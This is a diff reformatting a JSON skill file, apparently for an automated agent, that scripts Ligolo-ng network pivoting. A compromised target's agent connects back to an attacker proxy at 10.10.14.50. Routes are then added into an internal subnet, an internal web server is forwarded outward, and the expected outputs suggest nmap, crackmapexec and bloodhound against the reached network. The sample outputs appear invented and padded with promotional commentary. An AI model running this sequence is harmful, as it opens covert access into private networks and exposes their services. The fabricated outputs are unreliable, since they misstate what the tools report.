@@ -2,37 +2,130 @@
   "name": "ligolo_ng_tunneling",
   "description": "Ligolo-ng for advanced layer 3 network tunneling and pivoting",
   "pattern": "ligolo|layer.*3.*tunnel|tun.*interface",
-  "parameters": ["interface", "target_network"],
+  "parameters": [
+    "interface",
+    "target_network"
+  ],
   "sequence": [
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up"]},
-      "expected_output": {"type": "string", "example": "TUN interface created:\n  Name: ligolo\n  Type: TUN (layer 3)\n  Mode: Point-to-point\n  Owner: attacker\n  Status: UP\n\nVerify interface:\n  ip link show ligolo\n  5: ligolo: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500\n\nInterface ready for Ligolo-ng tunneling\n\nNext steps:\n  1. Start ligolo-ng proxy on attacker\n  2. Run ligolo-ng agent on target\n  3. Add routes to ligolo interface"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "TUN interface created:\n  Name: ligolo\n  Type: TUN (layer 3)\n  Mode: Point-to-point\n  Owner: attacker\n  Status: UP\n\nVerify interface:\n  ip link show ligolo\n  5: ligolo: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500\n\nInterface ready for Ligolo-ng tunneling\n\nNext steps:\n  1. Start ligolo-ng proxy on attacker\n  2. Run ligolo-ng agent on target\n  3. Add routes to ligolo interface"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "./proxy -selfcert -laddr 0.0.0.0:11601 &"]},
-      "expected_output": {"type": "string", "example": "WARN[0000] Using self-signed certificates\nINFO[0000] Listening on 0.0.0.0:11601\n\nLigolo-ng proxy started:\n  Listen address: 0.0.0.0:11601\n  TLS: Self-signed certificate\n  Mode: Waiting for agent connections\n\nAgent command (on target):\n  ./agent -connect attacker:11601 -ignore-cert\n\nProxy features:\n  - TLS encrypted tunnels\n  - Multiple agent support\n  - Layer 3 routing\n  - No SOCKS proxy needed\n  - True network extension\n\nManagement interface:\n  Will appear when agent connects\n  Commands: session, start, stop, listener_add"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "./proxy -selfcert -laddr 0.0.0.0:11601 &"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "WARN[0000] Using self-signed certificates\nINFO[0000] Listening on 0.0.0.0:11601\n\nLigolo-ng proxy started:\n  Listen address: 0.0.0.0:11601\n  TLS: Self-signed certificate\n  Mode: Waiting for agent connections\n\nAgent command (on target):\n  ./agent -connect attacker:11601 -ignore-cert\n\nProxy features:\n  - TLS encrypted tunnels\n  - Multiple agent support\n  - Layer 3 routing\n  - No SOCKS proxy needed\n  - True network extension\n\nManagement interface:\n  Will appear when agent connects\n  Commands: session, start, stop, listener_add"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "./agent -connect 10.10.14.50:11601 -ignore-cert &"]},
-      "expected_output": {"type": "string", "example": "WARN[0000] Ignoring certificate verification\nINFO[0000] Connecting to 10.10.14.50:11601\nINFO[0001] Connected to proxy!\nINFO[0001] Agent ID: 9a8b7c6d-5e4f-3a2b-1c0d-9e8f7a6b5c4d\n\nAgent connected successfully:\n  Proxy: 10.10.14.50:11601\n  Agent ID: 9a8b7c6d-5e4f-3a2b-1c0d-9e8f7a6b5c4d\n  TLS: Encrypted connection\n\nProxy console shows:\n  [Agent : PIVOT-DMZ-01] » \n  Available commands:\n    session        - List sessions\n    use <id>       - Select session\n    start          - Start tunnel\n    stop           - Stop tunnel\n    ifconfig       - Show agent interfaces\n    listener_add   - Add port listener"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "./agent -connect 10.10.14.50:11601 -ignore-cert &"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "WARN[0000] Ignoring certificate verification\nINFO[0000] Connecting to 10.10.14.50:11601\nINFO[0001] Connected to proxy!\nINFO[0001] Agent ID: 9a8b7c6d-5e4f-3a2b-1c0d-9e8f7a6b5c4d\n\nAgent connected successfully:\n  Proxy: 10.10.14.50:11601\n  Agent ID: 9a8b7c6d-5e4f-3a2b-1c0d-9e8f7a6b5c4d\n  TLS: Encrypted connection\n\nProxy console shows:\n  [Agent : PIVOT-DMZ-01] » \n  Available commands:\n    session        - List sessions\n    use <id>       - Select session\n    start          - Start tunnel\n    stop           - Stop tunnel\n    ifconfig       - Show agent interfaces\n    listener_add   - Add port listener"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo -e 'session\\nifconfig' | nc localhost 11601"]},
-      "expected_output": {"type": "string", "example": "ligolo-ng » session\n\nAvailable Sessions:\n┌────────┬──────────────────────────────────────┬──────────────┬───────────────┐\n│ ID     │ Agent ID                             │ Hostname     │ Address       │\n├────────┼──────────────────────────────────────┼──────────────┼───────────────┤\n│ 0      │ 9a8b7c6d-5e4f-3a2b-1c0d-9e8f7a6b5c4d │ PIVOT-DMZ-01 │ 10.10.10.100  │\n└────────┴──────────────────────────────────────┴──────────────┴───────────────┘\n\nligolo-ng » use 0\n[Agent : PIVOT-DMZ-01] » ifconfig\n\n┌──────────┬─────────────────┬──────────────────────────┐\n│ Interface│ IP Address      │ MAC Address              │\n├──────────┼─────────────────┼──────────────────────────┤\n│ eth0     │ 10.10.10.100/24 │ 00:0c:29:a1:b2:c3        │\n│ eth1     │ 192.168.10.5/24 │ 00:0c:29:a1:b2:c4        │\n└──────────┴─────────────────┴──────────────────────────┘\n\nDual-homed agent detected!\nInternal network: 192.168.10.0/24\nReady for routing"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "echo -e 'session\\nifconfig' | nc localhost 11601"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "ligolo-ng » session\n\nAvailable Sessions:\n┌────────┬──────────────────────────────────────┬──────────────┬───────────────┐\n│ ID     │ Agent ID                             │ Hostname     │ Address       │\n├────────┼──────────────────────────────────────┼──────────────┼───────────────┤\n│ 0      │ 9a8b7c6d-5e4f-3a2b-1c0d-9e8f7a6b5c4d │ PIVOT-DMZ-01 │ 10.10.10.100  │\n└────────┴──────────────────────────────────────┴──────────────┴───────────────┘\n\nligolo-ng » use 0\n[Agent : PIVOT-DMZ-01] » ifconfig\n\n┌──────────┬─────────────────┬──────────────────────────┐\n│ Interface│ IP Address      │ MAC Address              │\n├──────────┼─────────────────┼──────────────────────────┤\n│ eth0     │ 10.10.10.100/24 │ 00:0c:29:a1:b2:c3        │\n│ eth1     │ 192.168.10.5/24 │ 00:0c:29:a1:b2:c4        │\n└──────────┴─────────────────┴──────────────────────────┘\n\nDual-homed agent detected!\nInternal network: 192.168.10.0/24\nReady for routing"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "sudo ip route add 192.168.10.0/24 dev ligolo"]},
-      "expected_output": {"type": "string", "example": "Route added successfully:\n  Destination: 192.168.10.0/24\n  Device: ligolo (TUN interface)\n  Gateway: Agent on PIVOT-DMZ-01\n\nRouting table:\n  ip route show\n  192.168.10.0/24 dev ligolo scope link\n\nTraffic flow:\n  Attacker -> ligolo interface -> Ligolo-ng proxy -> Agent -> 192.168.10.0/24\n\nNow start tunnel on proxy console:\n  [Agent : PIVOT-DMZ-01] » start\n  [Agent : PIVOT-DMZ-01] » INFO[0000] Starting tunnel to PIVOT-DMZ-01\n\nTest connectivity:\n  ping 192.168.10.20\n  nmap -sS -Pn 192.168.10.0/24\n  curl http://192.168.10.20"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "sudo ip route add 192.168.10.0/24 dev ligolo"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Route added successfully:\n  Destination: 192.168.10.0/24\n  Device: ligolo (TUN interface)\n  Gateway: Agent on PIVOT-DMZ-01\n\nRouting table:\n  ip route show\n  192.168.10.0/24 dev ligolo scope link\n\nTraffic flow:\n  Attacker -> ligolo interface -> Ligolo-ng proxy -> Agent -> 192.168.10.0/24\n\nNow start tunnel on proxy console:\n  [Agent : PIVOT-DMZ-01] » start\n  [Agent : PIVOT-DMZ-01] » INFO[0000] Starting tunnel to PIVOT-DMZ-01\n\nTest connectivity:\n  ping 192.168.10.20\n  nmap -sS -Pn 192.168.10.0/24\n  curl http://192.168.10.20"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "ping", "args": ["-c", "3", "192.168.10.20"]},
-      "expected_output": {"type": "string", "example": "PING 192.168.10.20 (192.168.10.20) 56(84) bytes of data.\n64 bytes from 192.168.10.20: icmp_seq=1 ttl=128 time=45.2 ms\n64 bytes from 192.168.10.20: icmp_seq=2 ttl=128 time=43.8 ms\n64 bytes from 192.168.10.20: icmp_seq=3 ttl=128 time=44.5 ms\n\n--- 192.168.10.20 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2003ms\nrtt min/avg/max/mdev = 43.827/44.500/45.223/0.572 ms\n\nICMP working through Ligolo-ng tunnel!\n\nInternal network directly accessible:\n  - No SOCKS proxy needed\n  - No proxychains configuration\n  - All tools work natively:\n    * nmap -sS 192.168.10.0/24 (SYN scan)\n    * crackmapexec smb 192.168.10.0/24\n    * bloodhound-python -d corp.local -ns 192.168.10.10\n\nLayer 3 advantages:\n  - True IP routing\n  - Support for all protocols (TCP, UDP, ICMP)\n  - No application proxy needed\n  - Better performance"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "ping",
+        "args": [
+          "-c",
+          "3",
+          "192.168.10.20"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "PING 192.168.10.20 (192.168.10.20) 56(84) bytes of data.\n64 bytes from 192.168.10.20: icmp_seq=1 ttl=128 time=45.2 ms\n64 bytes from 192.168.10.20: icmp_seq=2 ttl=128 time=43.8 ms\n64 bytes from 192.168.10.20: icmp_seq=3 ttl=128 time=44.5 ms\n\n--- 192.168.10.20 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2003ms\nrtt min/avg/max/mdev = 43.827/44.500/45.223/0.572 ms\n\nICMP working through Ligolo-ng tunnel!\n\nInternal network directly accessible:\n  - No SOCKS proxy needed\n  - No proxychains configuration\n  - All tools work natively:\n    * nmap -sS 192.168.10.0/24 (SYN scan)\n    * crackmapexec smb 192.168.10.0/24\n    * bloodhound-python -d corp.local -ns 192.168.10.10\n\nLayer 3 advantages:\n  - True IP routing\n  - Support for all protocols (TCP, UDP, ICMP)\n  - No application proxy needed\n  - Better performance"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'listener_add --addr 0.0.0.0:1234 --to 192.168.10.20:80' | nc localhost 11601"]},
-      "expected_output": {"type": "string", "example": "[Agent : PIVOT-DMZ-01] » listener_add --addr 0.0.0.0:1234 --to 192.168.10.20:80\nINFO[0000] Listener created on 0.0.0.0:1234 -> 192.168.10.20:80\n\nReverse port forward created:\n  Listen: 0.0.0.0:1234 (attacker machine)\n  Forward: 192.168.10.20:80 (internal web server)\n\nAccess internal service:\n  curl http://127.0.0.1:1234\n  firefox http://127.0.0.1:1234\n\nListener features:\n  - Expose internal services externally\n  - No inbound firewall rules needed on target\n  - Encrypted via Ligolo-ng tunnel\n  - Multiple listeners supported\n\nList active listeners:\n  listener_list\n\nRemove listener:\n  listener_stop --id 0"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "echo 'listener_add --addr 0.0.0.0:1234 --to 192.168.10.20:80' | nc localhost 11601"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "[Agent : PIVOT-DMZ-01] » listener_add --addr 0.0.0.0:1234 --to 192.168.10.20:80\nINFO[0000] Listener created on 0.0.0.0:1234 -> 192.168.10.20:80\n\nReverse port forward created:\n  Listen: 0.0.0.0:1234 (attacker machine)\n  Forward: 192.168.10.20:80 (internal web server)\n\nAccess internal service:\n  curl http://127.0.0.1:1234\n  firefox http://127.0.0.1:1234\n\nListener features:\n  - Expose internal services externally\n  - No inbound firewall rules needed on target\n  - Encrypted via Ligolo-ng tunnel\n  - Multiple listeners supported\n\nList active listeners:\n  listener_list\n\nRemove listener:\n  listener_stop --id 0"
+      }
     }
   ],
-  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
   "created_by": "neural_mesh_v5.2_generator"
 }
